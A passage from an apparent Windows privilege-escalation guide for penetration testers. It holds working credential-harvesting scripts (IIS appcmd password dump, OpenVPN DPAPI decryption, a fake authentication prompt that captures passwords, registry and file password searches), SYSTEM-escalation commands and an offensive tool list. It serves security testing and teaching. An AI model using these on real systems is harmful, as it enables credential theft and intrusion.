    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Check if `C:\Windows\CCM\SCClient.exe` exists .  
Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading \(Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**\).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry \(Credentials\)

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

### Putty SSH Host Keys

```text
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys`  so you should check if there is anything interesting in there:

```text
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract).  
More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

If `ssh-agent` service is not running and you want it to automatically start on boot run:

```text
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

{% hint style="info" %}
It looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with `ssh-add` and login via ssh to a machine. The registry HKCU\Software\OpenSSH\Agent\Keys doesn't exist and procmon didn't identify the use of `dpapi.dll` during the asymmetric key authentication.
{% endhint %}

### Unattended files

```text
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

You can also search for these files using **metasploit**: _post/windows/gather/enum\_unattend_

Example content_:_

```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM backups

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Cloud Credentials

```bash
##From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### Cached GPP Pasword

Before KB2928120 \(see MS14-025\), some Group Policy Preferences could be configured with a custom account. This feature was mainly used to deploy a custom local administrator account on a group of machines. There were two problems with this approach though. First, since the Group Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second problem is that the password set in these GPPs is AES256-encrypted with a default key, which is publicly documented. This means that any authenticated user could potentially access very sensitive data and elevate their privileges on their machine or even the domain. This function will check whether any locally cached GPP file contains a non-empty "cpassword" field. If so, it will decrypt it and return a custom PS object containing some information about the GPP along with the location of the file.

Search in ****_**C:\ProgramData\Microsoft\Group Policy\history**_  or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** \(previous to W Vista\)_ for these files:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**To decrypt the cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```text
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Example of web.config with credentials:

```markup
<authentication mode="Forms"> 
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes, 
    $entropy, 
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ask for credentials

You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them \(notice that **asking** the client directly for the **credentials** is really **risky**\):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Possible filenames containing credentials**

Known files that some time ago contained **passwords** in **clear-text** or **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Search all of the proposed files:

```text
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```text
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials in the RecycleBin

You should also check the Bin to look for credentials inside it

To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

#### Other possible registry keys with credentials

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)\*\*\*\*

### Browsers History

You should check for dbs where passwords from **Chrome or Firefox** are stored.  
Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.

Tools to extract passwords from browsers:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)\*\*\*\*

### **Generic Password search in files and registry**

#### Search for file contents

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

#### Search for a file with a certain filename

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

#### Search the registry for key names and passwords

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.  
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.  
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text \(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** \(`OpenProcess()`\) with **full access**. The same process **also create a new process** \(`CreateProcess()`\) **with low privileges but inheriting all the open handles of the main process**.  
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.   
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)  
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions \(not only full access\)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

A `pipe` is a block of shared memory that processes can use for communication and data exchange.

`Named Pipes` is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very similar to client/server architecture as notions such as `a named pipe server` and a named `pipe client` exist.

When a **client writes on a pipe**, the **server** that created the pipe can **impersonate** the **client** if it has **SeImpersonate** privileges. Then, if you can find a **privileged process that is going to write on any pipe that you can impersonate**, you could be able to **escalate privileges** impersonating that process after it writes inside your created pipe. [**You can read this to learn how to perform this attack**](named-pipe-client-impersonation.md)**.**

## From Administrator Medium to High Integrity Level / UAC Bypass

\*\*\*\*[**Read this to learn about Integrity Levels**](integrity-levels.md) **and** [**this to learn what is UAC**](../authentication-credentials-uac-and-efs.md#uac)**, then read how to**[ **bypass it**](../authentication-credentials-uac-and-efs.md#uac)**.**

## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **pass to SYSTEM** can be easy just **creating and executing a new service**:

```text
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.   
[More information about the registry keys involved and how to install a _.msi_ package here.](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges \(probably you will find this in an already High Integrity process\), you will be able to **open almost any process** \(not protected processes\) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.  
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** \(_yes, you can find SYSTEM processes without all the token privileges_\).  
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client \(the service\) obtaining SYSTEM privileges.  
If you want to [**learn more about name pipes you should read this**](./#named-pipe-client-impersonation).  
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.  
**You can** [**learn more about Dll hijacking here**](dll-hijacking.md)**.**

### **From Administrator or Network Service to System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

###  From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)\*\*\*\*

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

#### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\*\*\*\*

#### PS

\*\*\*\*[**PowerSploit-Privesc\(PowerUP\)**](https://github.com/PowerShellMafia/PowerSploit) -- Check for misconfigurations and sensitive files \([check here]()\). Detected.  
[**JAWS**](https://github.com/411Hall/JAWS) ****-- Check for some possible misconfigurations and gather info \([check here]()\).  
[**privesc** ](https://github.com/enjoiz/Privesc)-- Check for misconfigurations  
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) ****-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use **-Thorough** in local.  
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) ****-- Extracts crendentials from Credential Manager. Detected.  
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) ****-- Spray gathered passwords across domain  
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ****-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.  
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) -- Basic privesc Windows enumeration  
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock)  ~~****~~-- Search for known privesc vulnerabilities \(DEPRECATED for Watson\)  
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) ~~****~~-- Local checks **\(Need Admin rights\)**

#### Exe

[**Watson**](https://github.com/rasta-mouse/Watson) ****-- Search for known privesc vulnerabilities \(needs to be compiled using VisualStudio\) \([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)\)  
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) ****-- Enumerates the host searching for misconfigurations \(more a gather info tool than privesc\) \(needs to be compiled\) **\(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**\)**  
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) ****-- Extracts credentials from lots of softwares \(precompiled exe in github\)  
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) ~~****~~-- Check for misconfiguration \(executable precompiled in github\). Not recommended. It does not work well in Win10.  
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations \(exe from python\). Not recommended. It does not work well in Win10.

#### Bat

\*\*\*\*[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post \(it does not need accesschk to work properly but it can use it\).

#### Local

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits \(local python\)  
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits \(local python\)

#### Meterpreter

_multi/recon/local\_exploit\_suggestor_

You have to compile the project using the correct version of .NET \([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)\). To see the installed version of .NET on the victim host you can do:

```text
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## Bibliography

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)  
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)  
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)  
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)  
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)  
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)  
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)  
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)  
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)  
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)  
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md\#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

